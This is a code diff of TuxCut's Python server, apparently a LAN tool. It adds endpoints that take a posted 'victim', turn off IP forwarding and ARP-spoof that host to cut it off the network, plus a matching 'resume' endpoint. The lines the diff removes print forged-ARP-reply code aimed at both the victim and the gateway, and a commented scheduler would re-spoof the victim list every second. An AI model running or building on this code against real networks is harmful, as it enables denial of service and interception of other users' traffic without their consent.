@@ -7,98 +7,40 @@ from scapy.all import *
 from bottle import route, run
 from bottle import request, response
 
-from apscheduler.schedulers.background import BackgroundScheduler
-from apscheduler.triggers.interval import IntervalTrigger
+# from apscheduler.schedulers.background import BackgroundScheduler
+# from apscheduler.triggers.interval import IntervalTrigger
 
 
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
-handler = logging.FileHandler('/var/log/tuxcut/tuxcut-server.log')
-formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
-handler.setFormatter(formatter)
-
-logger.addHandler(handler)
+from utils import logger
+from utils import get_default_gw, get_hostname
+from utils import enable_ip_forward, disable_ip_forward, arp_spoof, arp_unspoof
 
 victims = list()
 
 
-# def test_scheduler():
+# def attack_victims():
 #     if len(victims) > 0:
-#         print('### ', victims)
+#         for victim in victims:
+#             arp_spoof(victim)
 #
 #
 # scheduler = BackgroundScheduler()
 # scheduler.start()
 # scheduler.add_job(
-#     func=test_scheduler,
-#     trigger=IntervalTrigger(seconds=5),
-#     id='printing_job',
-#     name='Print date and time every five seconds',
+#     func=attack_victims,
+#     trigger=IntervalTrigger(seconds=1),
+#     id='arp_attack_job',
+#     name='ARP Spoofing the victim list',
 #     replace_existing=True)
-#
-# # Shut down the scheduler when exiting the app
-# atexit.register(lambda: scheduler.shutdown())
 
 
-def get_hostname(ip):
-    """
-    use nslookup from dnsutils package to get hostname for an ip
-    """
-    ans = sp.Popen(['nslookup', ip], stdout=sp.PIPE)
-    for line in ans.stdout:
-        line = line.decode('utf-8')
-        if 'name = ' in line:
-            return line.split(' ')[-1].strip('.\n')
+# Shut down the scheduler when exiting the app
+def on_server_exit():
+    logger.info('TuxCut server is shutting down')
+    enable_ip_forward()
+    # scheduler.shutdown()
 
-
-def enable_ip_forward():
-    sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
-
-
-def disable_ip_forward():
-    sp.Popen(['sysctl', '-w', 'net.ipv4.ip_forward=0'])
-
-
-def arp_spoof(self, victim_ip, victim_hw):
-    # cheat the victim
-    pkt_1 = ARP()
-    pkt_1.op = 2
-    pkt_1.psrc = self.gwip
-    pkt_1.hwsrc = self.myhw
-    pkt_1.pdst = victim_ip
-    pkt_1.hwdst = victim_hw
-
-    # cheat the gateway
-    pkt_2 = ARP()
-    pkt_2.op = 2
-    pkt_2.psrc = victim_ip
-    pkt_2.hwsrc = self.myhw
-    pkt_2.pdst = self.gwip
-    pkt_2.hwdst = self.gwhw
-
-    send(pkt_1, count=3)
-    send(pkt_2, count=3)
-
-
-def arp_unspoof(self, victim_ip, victim_hw):
-    # Correct  the victim arp table
-    pkt_1 = ARP()
-    pkt_1.op = 2
-    pkt_1.psrc = self.gwip
-    pkt_1.hwsrc = self.gwhw
-    pkt_1.pdst = victim_ip
-    pkt_1.hwdst = victim_hw
-
-    # Correct  the gateway arptable
-    pkt_2 = ARP()
-    pkt_2.op = 2
-    pkt_2.psrc = victim_ip
-    pkt_2.hwsrc = victim_hw
-    pkt_2.pdst = self.gwip
-    pkt_2.hwdst = self.gwhw
-
-    send(pkt_1, count=3)
-    send(pkt_2, count=3)
+atexit.register(on_server_exit)
 
 
 @route('/status')
@@ -112,21 +54,6 @@ def server_status():
         'status':  'success',
         'msg': 'TuxCut server is running'
     })
-
-
-# @route('/ifaces')
-# def get_ifaces():
-#     """
-#     all the available network interfaces except  'lo'
-#     """
-#     response.headers['Content-Type'] = 'application/json'
-#     ifaces = netifaces.interfaces()
-#     if 'lo' in ifaces:
-#         ifaces.remove('lo')
-#     return json.dumps({
-#         'status': 'success',
-#         'ifaces': ifaces
-#     })
 
 
 @route('/my/<iface>')
@@ -158,35 +85,18 @@ def get_my(iface):
 
 
 @route('/gw')
-def get_default_gw():
+def get_gw():
     """
     Get the default gw ip address with the iface
     """
     response.headers['Content-Type'] = 'application/json'
-
-    if netifaces.AF_INET in netifaces.gateways()['default']:
-        default_gw = netifaces.gateways()['default'][netifaces.AF_INET]
-
-        # initialize gw_mac with empty string
-        gw_mac = ''
-
-        # send arp packet to gw to get the MAC Address of the router
-        results, unanswered = sr(ARP(op=ARP.who_has, psrc='8.8.8.8', pdst=default_gw[0]))
-        for r in results[0]:
-            if r.psrc == default_gw[0]:
-                gw_mac = r.hwsrc
-
+    gw = get_default_gw()
+    if gw:
         return json.dumps({
             'status': 'success',
-            'gw': {
-                'ip': default_gw[0],
-                'mac': gw_mac,
-                'hostname': get_hostname(default_gw[0]),
-                'iface': default_gw[1]
-            }
+            'gw': gw
         })
     else:
-        print('No internet')
         return json.dumps({
             'status': 'error',
             'msg': 'This computer is not connected'
@@ -201,7 +111,7 @@ def scan(gw_ip):
     ans, unans = arping('{}/24'.format(gw_ip), verbose=False)
 
     for i in range(0, len(ans)):
-        live_hosts.append ({
+        live_hosts.append({
             'ip': ans[i][1].psrc,
             'mac': ans[i][1].hwsrc,
             'hostname': get_hostname(ans[i][1].psrc)
@@ -266,13 +176,29 @@ def add_to_victims():
     response.headers['Content-Type'] = 'application/json'
 
     new_victim = request.json
-    print(new_victim)
-    if not new_victim in victims:
-        victims.append(new_victim)
+    if new_victim not in victims:
+        disable_ip_forward()
+        arp_spoof(new_victim)
+        # victims.append(new_victim)
 
     return json.dumps({
         'status': 'success',
         'msg': 'new victim add'
+    })
+
+
+@route('/resume', method='POST')
+def resume_victim():
+    response.headers['Content-Type'] = 'application/json'
+
+    victim = request.json
+    if victim in victims:
+        victims.remove(victim)
+    arp_unspoof(victim)
+
+    return json.dumps({
+        'status': 'success',
+        'msg': 'victim  resumed'
     })
 
 
